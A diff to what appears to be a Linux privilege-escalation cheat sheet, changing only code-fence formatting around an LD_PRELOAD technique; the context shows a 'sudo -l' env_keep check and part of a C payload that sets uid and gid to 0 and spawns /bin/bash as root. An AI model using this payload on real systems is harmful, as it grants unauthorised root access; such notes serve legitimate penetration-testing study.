@@ -14,7 +14,7 @@ You can use ```https://gtfobins.org/``` to check what applications might bypass 
 ### LD_PRELOAD
 Using **sudo -l** you an option may be avaiable called ```env_keep+=LD_PRELOAD``` which is another possible priviledge escalation.
 
-'''
+```
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -25,7 +25,7 @@ setgid(0);
 setuid(0);
 system("/bin/bash");
 }
-'''
+```
 
 
 ## SUID
